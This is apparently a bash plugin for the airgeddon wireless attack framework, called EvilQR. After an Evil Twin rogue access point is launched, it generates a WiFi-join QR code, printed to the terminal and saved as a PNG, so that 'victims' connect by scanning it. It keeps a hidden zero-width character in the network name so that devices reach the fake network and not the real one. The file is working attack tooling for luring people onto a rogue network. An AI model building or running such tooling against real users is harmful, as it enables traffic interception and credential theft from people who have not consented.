#!/usr/bin/env bash

#Global shellcheck disabled warnings
#shellcheck disable=SC2034,SC2154

###### GENERIC PLUGIN VARS ######

plugin_name="EvilQR"
plugin_description="Generate a WiFi join QR code for the Evil Twin access point so victims can be associated by scanning instead of deauthentication"
plugin_author="skinnypuppy"
plugin_enabled=0

###### PLUGIN REQUIREMENTS ######

plugin_minimum_ag_affected_version="10.0"
plugin_maximum_ag_affected_version=""

plugin_distros_supported=("*")

###### CUSTOM FUNCTIONS ######

#Language strings for EvilQR
function evilqr_prehook_hookable_for_languages() {

	arr["ENGLISH","evilqr_1"]="\${blue_color}EvilQR plugin \${normal_color}[Evil Twin association without deauthentication]. \${green_color}Have the victim scan this QR code to join the Evil Twin access point (ESSID: \${normal_color}${et_essid}\${green_color}):"
	arr["SPANISH","evilqr_1"]="\${blue_color}Plugin EvilQR \${normal_color}[Asociación al Evil Twin sin desautenticación]. \${green_color}Haz que la víctima escanee este código QR para unirse al punto de acceso Evil Twin (ESSID: \${normal_color}${et_essid}\${green_color}):"

	arr["ENGLISH","evilqr_2"]="\${yellow_color}The QR code was also saved as \${normal_color}${qr_file}\${yellow_color} in the directory where airgeddon was launched"
	arr["SPANISH","evilqr_2"]="\${yellow_color}El código QR también se ha guardado como \${normal_color}${qr_file}\${yellow_color} en el directorio donde se lanzó airgeddon"

	arr["ENGLISH","evilqr_3"]="\${blue_color}EvilQR plugin \${normal_color}[\${yellow_color}WPA-Enterprise\${normal_color} mode detected]. \${yellow_color}Skipping WiFi join QR generation"
	arr["SPANISH","evilqr_3"]="\${blue_color}Plugin EvilQR \${normal_color}[modo \${yellow_color}WPA-Enterprise\${normal_color} detectado]. \${yellow_color}Omitiendo la generación del código QR de conexión"

	arr["ENGLISH","evilqr_4"]="\${red_color}EvilQR plugin\${normal_color}: qrencode is not installed. QR code generation disabled. Please install the qrencode package for your distro"
	arr["SPANISH","evilqr_4"]="\${red_color}Plugin EvilQR\${normal_color}: qrencode no está instalado. Generación de código QR deshabilitada. Por favor instala el paquete qrencode de tu distribución"
}

#Escape a string for inclusion in a WIFI: QR payload
#The special characters of the WIFI: format (\ ; , : ") must be backslash-escaped
function evilqr_escape_wifi_string() {

	local escaped_string

	escaped_string="${1}"
	escaped_string="${escaped_string//\\/\\\\}"
	escaped_string="${escaped_string//;/\\;}"
	escaped_string="${escaped_string//,/\\,}"
	escaped_string="${escaped_string//:/\\:}"
	escaped_string="${escaped_string//\"/\\\"}"

	printf '%s' "${escaped_string}"
}

#Generate the WiFi join QR code for the Evil Twin access point
#The QR payload follows the WIFI: network config format understood by the
#built-in scanners of Android and iOS. The Evil Twin is an open access point
#(wpa=0), so T:nopass makes scanning devices join it with no interaction.
#Note: et_essid is used verbatim, including the zero width space character
#appended by generate_fake_essid, so that joining devices reach the Evil
#Twin and not the original access point.
function evilqr_generate_join_qr() {

	debug_print

	if ! command -v qrencode > /dev/null 2>&1; then
		language_strings "${language}" "evilqr_4" "red"
		return 1
	fi

	if [ -n "${enterprise_mode}" ]; then
		language_strings "${language}" "evilqr_3" "blue"
		return 1
	fi

	local qr_payload
	local qr_ssid

	qr_ssid=$(evilqr_escape_wifi_string "${et_essid}")
	qr_payload="WIFI:S:${qr_ssid};T:nopass;;"

	qr_file="evilqr_$(printf '%s' "${et_essid}" | tr -cd '[:alnum:]_-').png"

	qrencode -t ANSIUTF8 -m 2 -l M "${qr_payload}"

	qrencode -t PNG -m 4 -s 6 -l M -o "${qr_file}" "${qr_payload}"
}

###### FUNCTION HOOKING: POSTHOOK ######

#After the Evil Twin access point is launched, print a scannable WiFi join
#QR code and save it as a PNG file next to airgeddon's other attack outputs
function evilqr_posthook_launch_fake_ap() {

	debug_print

	evilqr_generate_join_qr

	echo
	language_strings "${language}" "evilqr_2" "yellow"

	return 0
}
